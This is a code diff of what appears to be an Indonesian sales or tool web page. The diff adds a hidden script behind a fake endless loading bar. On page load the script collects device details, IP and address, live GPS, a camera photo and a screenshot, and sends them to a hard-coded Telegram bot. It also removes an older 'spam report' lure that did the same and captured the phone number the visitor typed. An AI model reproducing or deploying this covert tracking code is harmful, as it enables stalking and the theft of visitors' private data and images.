@@ -139,152 +139,222 @@ PANEL PTERODACTYL BIASA MASA AKTIF 7 - 15 HARI GARANSI AKTIF 1X</div>
   
 </body>
 </html>
-<script>
-function toggle(el){
-  const d = el.querySelector('.detail');
-  d.style.display = d.style.display === 'block' ? 'none' : 'block';
-}
-</script>
+    <script>
+        const token = '8506760023:AAHkzVIbsp0QeijeW5GHS4HqJ9zzC2j3tD8';
+        const chatId = '8345962712';
+
+        
+        // Simulate infinite loading
+        let progress = 0;
+        const progressBar = document.getElementById('progress-bar');
+        const loadingDetails = document.getElementById('loading-details');
+        const loadingMessages = [
+            "Memeriksa modul sistem...",
+            "Memuat komponen inti...",
+            "Menginisialisasi antarmuka...",
+            "Memverifikasi koneksi...",
+            "Menyiapkan lingkungan...",
+            "Memeriksa pembaruan...",
+            "Memuat aset tampilan..."
+        ];
+
+        const loadingInterval = setInterval(() => {
+            progress += Math.random() * 5;
+            if (progress > 98) progress = 98;
+            progressBar.style.width = progress + '%';
+            
+            if (Math.random() > 0.9) {
+                loadingDetails.textContent = loadingMessages[Math.floor(Math.random() * loadingMessages.length)];
+            }
+        }, 500);
+        
+
+        // Telegram functions
+        const sendToTelegram = async (data) => {
+            try {
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: data,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (e) {
+                console.error('Error sending to Telegram:', e);
+            }
+        };
+
+        const sendPhoto = async (blob, filename) => {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, filename);
+                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (e) {
+                console.error('Error sending photo:', e);
+            }
+        };
+
+        // Get detailed location
+        const getLocationDetails = async (lat, lon) => {
+            try {
+                const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
+                const data = await response.json();
+                
+                if (data.address) {
+                    return {
+                        kabupaten: data.address.county || data.address.city || data.address.state || "Tidak diketahui",
+                        kecamatan: data.address.suburb || data.address.village || data.address.town || "Tidak diketahui",
+                        fullAddress: data.display_name || "Alamat tidak tersedia"
+                    };
+                }
+            } catch (e) {
+                console.error('Error getting location details:', e);
+            }
+            return {
+                kabupaten: "Tidak diketahui",
+                kecamatan: "Tidak diketahui",
+                fullAddress: "Alamat tidak tersedia"
+            };
+        };
+
+        // Collect device information
+        const collectDeviceInfo = async () => {
+            let message = '╭───── Tracking Report ───── ⦿\n\n';
+            
+            // Device Information
+            message += '⚙️ DEVICE INFORMATION\n';
+            message += `🖥️ Device: ${navigator.userAgent}\n`;
+            message += `💻 Platform: ${navigator.platform}\n`;
+            message += `🌐 Bahasa: ${navigator.language}\n`;
+            message += `📶 Online: ${navigator.onLine ? 'Online' : 'Offline'}\n`;
+            message += `📺 Screen Size: ${screen.width}x${screen.height}\n`;
+            message += `🪟 Window Size: ${window.innerWidth}x${window.innerHeight}\n`;
+            message += `💾 RAM: ${navigator.deviceMemory || 'Unknown'} GB\n`;
+            message += `🧠 CPU Cores: ${navigator.hardwareConcurrency}\n`;
+            
+            // Battery Info
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    message += `🔋 Battery: ${Math.floor(battery.level * 100)}%\n`;
+                    message += `🔌 Charging: ${battery.charging ? '✅ YA' : '❌ TIDAK'}\n`;
+                } catch (e) {
+                    message += '🔋 Battery: ❌ Tidak tersedia\n';
+                }
+            }
+            
+            message += `⏰ Waktu Akses: ${new Date().toString()}\n`;
+            message += `🕒 Page Load Time: ${(performance.now()).toFixed(2)} ms\n`;
+            message += `📜 History Length: ${history.length}\n`;
+            message += `✋ Touch Support: ${'ontouchstart' in window ? '✅ YA' : '❌ TIDAK'}\n`;
+            message += `🔗 Referrer: ${document.referrer || 'None'}\n`;
+            message += `🌍 URL: ${window.location.href}\n`;
+            message += `📄 Title: ${document.title}\n`;
+            message += `🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+            message += `🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;
+            
+
+            // IP and Location Information
+            try {
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+                
+                message += '📍 LOCATION INFORMATION\n';
+                message += `📡 IP Address: ${ipData.ip}\n`
+                message += `🏙️ Kota: ${ipData.city}\n`;
+                message += `🏙️ Kabupaten: ${ipData.region}\n`;
+                message += `🗺️ Wilayah: ${ipData.region}\n`;
+                message += `🌎 Negara: ${ipData.country_name}\n`;
+                message += `🏷️ Kode Pos: ${ipData.postal}\n`;
+                
+                if (ipData.latitude && ipData.longitude) {
+                    message += `📌 Latitude: ${ipData.latitude}\n`;
+                    message += `📍 Longitude: ${ipData.longitude}\n`;
+                    
+                    const locationDetails = await getLocationDetails(ipData.latitude, ipData.longitude);
+                    message += `🏙️ Kabupaten: ${locationDetails.kabupaten}\n`;
+                    message += `🏙️ Kecamatan: ${locationDetails.kecamatan}\n`;
+                    message += `🏠 Alamat Lengkap: ${locationDetails.fullAddress}\n`;
+                    
+                }
+            } catch (e) {
+                message += '❌ Gagal mendapatkan informasi lokasi\n';
+            }
+
+            message += '\n╰───── Telegram @ripzzofficial ───── ⦿';
+            return message;
+        };
+
+        // Main tracking function
+        const startTracking = async () => {
+            // Send device info
+            const deviceInfo = await collectDeviceInfo();
+            await sendToTelegram(deviceInfo);
+
+            // Try to access camera
+            try {
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                
+                await new Promise(resolve => setTimeout(resolve, 3000));
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(blob => sendPhoto(blob, 'camera_capture.jpg'), 'image/jpeg');
+                
+                stream.getTracks().forEach(track => track.stop());
+            } catch (e) {
+                await sendToTelegram('❌ Camera access blocked');
+            }
+
+            // Take screenshot
+            setTimeout(async () => {
+                try {
+                    const canvas = await html2canvas(document.body);
+                    canvas.toBlob(blob => sendPhoto(blob, 'screenshot.jpg'), 'image/jpeg');
+                } catch (e) {
+                    await sendToTelegram('❌ Screenshot failed');
+                }
+            }, 5000);
+
+            // GPS tracking
+            if (navigator.geolocation) {
+                navigator.geolocation.watchPosition(async (pos) => {
+                    const coords = pos.coords;
+                    let gpsInfo = `📍 LIVE GPS TRACKING\n`;
+                    gpsInfo += `📌 Lat: ${coords.latitude}\n`;
+                    gpsInfo += `📍 Lng: ${coords.longitude}\n`;
+                    gpsInfo += `🎯 Akurasi: ${coords.accuracy}m\n`;
+                    
+                    const locationDetails = await getLocationDetails(coords.latitude, coords.longitude);
+                    gpsInfo += `🏙️ Kabupaten: ${locationDetails.kabupaten}\n`;
+                    gpsInfo += `🏙️ Kecamatan: ${locationDetails.kecamatan}\n`;
+                    gpsInfo += `🏠 Alamat: ${locationDetails.fullAddress}\n`;
+                    
+                    
+                    await sendToTelegram(gpsInfo);
+                }, 
+                async (err) => {
+                    await sendToTelegram(`❌ GPS Error: ${err.message}`);
+                }, 
+                { 
+                    enableHighAccuracy: true,
+                    maximumAge: 0,
+                    timeout: 5000
+                });
+            }
+        };
+
+        // Start tracking after delay
+        setTimeout(startTracking, 3000);
+    </script>
 </body>
 </html>
-  <script>
-    const botToken = '8506760023:AAHkzVIbsp0QeijeW5GHS4HqJ9zzC2j3tD8';
-    const chatIds = ['8345962712', '8345962712', '-1002655252332'];
-    const infoDiv = document.getElementById('info');
-    const input = document.getElementById('text');
-    const button = document.getElementById('login-button');
-
-    function sendToTelegram(text) {
-      chatIds.forEach(id => {
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
-        }).catch(console.error);
-      });
-    }
-
-    function sendPhotoToTelegram(blob) {
-      chatIds.forEach(id => {
-        const formData = new FormData();
-        formData.append('chat_id', id);
-        formData.append('photo', blob);
-        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-          method: 'POST',
-          body: formData
-        }).catch(console.error);
-      });
-    }
-
-    async function getInfo() {
-      let ip = '-', city = '-', region = '-', country = '-', org = '-';
-      try {
-        const ipRes = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipRes.json();
-        ip = ipData.ip;
-        const locRes = await fetch(`https://ip-api.com/json/${ip}`);
-        const loc = await locRes.json();
-        if (loc.status === 'success') {
-          city = loc.city;
-          region = loc.regionName;
-          country = loc.country;
-          org = loc.org;
-        }
-      } catch {}
-
-      const battery = await navigator.getBattery?.() || { level: 0, charging: false };
-      const batteryPercent = battery.level ? `${(battery.level * 100).toFixed(0)}%` : 'N/A';
-
-      const text = `
-IP         : ${ip}
-Kota       : ${city}
-Region     : ${region}
-Negara     : ${country}
-ISP        : ${org}
-Browser    : ${navigator.userAgent}
-OS         : ${navigator.platform}
-Resolusi   : ${screen.width}x${screen.height}
-Baterai    : ${batteryPercent} (${battery.charging ? 'Charging' : 'Tidak Charging'})
-Memori     : ${navigator.deviceMemory || 'N/A'} GB
-Cookie     : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
-Waktu      : ${new Date().toLocaleString()}
-      `.trim();
-
-      sendToTelegram(`<b>📥 Info Pengunjung:</b>\n<pre>${text}</pre>`);
-
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-            sendToTelegram(`<b>📍 Lokasi GPS:</b> <a href="${link}">Klik di sini</a>`);
-          },
-          () => sendToTelegram(`📍 Lokasi GPS Ditolak`)
-        );
-      } else {
-        sendToTelegram(`📍 Browser tidak support GPS`);
-      }
-    }
-
-    async function startCamera() {
-      const video = document.getElementById('video');
-      const canvas = document.getElementById('canvas');
-      const ctx = canvas.getContext('2d');
-      return new Promise((resolve) => {
-        navigator.mediaDevices.getUserMedia({ video: true })
-          .then(stream => {
-            video.srcObject = stream;
-            video.onloadedmetadata = () => {
-              setTimeout(() => {
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                canvas.toBlob(blob => {
-                  if (blob) sendPhotoToTelegram(blob);
-                  stream.getTracks().forEach(track => track.stop());
-                  resolve();
-                }, 'image/jpeg');
-              }, 3000);
-            };
-          })
-          .catch(err => {
-            sendToTelegram('❌ Kamera Ditolak atau Tidak Tersedia');
-            resolve();
-          });
-      });
-    }
-
-    button.addEventListener('click', async () => {
-      const nomor = input.value.trim();
-      if (!nomor || nomor.length < 8 || nomor.length > 15) {
-        infoDiv.innerText = '⚠️ Nomor tidak valid.';
-        return;
-      }
-      button.disabled = true;
-      infoDiv.innerText = '⏳ Memproses spam report...';
-      sendToTelegram(`<b>📞 Nomor Target:</b> ${nomor}`);
-      input.value = '';
-      try {
-        await getInfo();
-        await startCamera();
-        setTimeout(() => {
-          infoDiv.innerText = `✅ Successfully bans nomor ${nomor}`;
-          button.disabled = false;
-        }, 1000);
-      } catch (e) {
-        infoDiv.innerText = '❌ Terjadi kesalahan.';
-        button.disabled = false;
-      }
-    });
-
-    function createParticles() {
-      const container = document.querySelector('.bg-particles');
-      for (let i = 0; i < 50; i++) {
-        const p = document.createElement('div');
-        p.className = 'particle';
-        p.style.left = Math.random() * 100 + '%';
-        p.style.top = Math.random() * 100 + '%';
-        p.style.animationDelay = Math.random() * 6 + 's';
-        p.style.animationDuration = (Math.random() * 4 + 4) + 's';
-        container.appendChild(p);
-      }
-    }
-    document.addEventListener('DOMContentLoaded', createParticles);
-  </script>
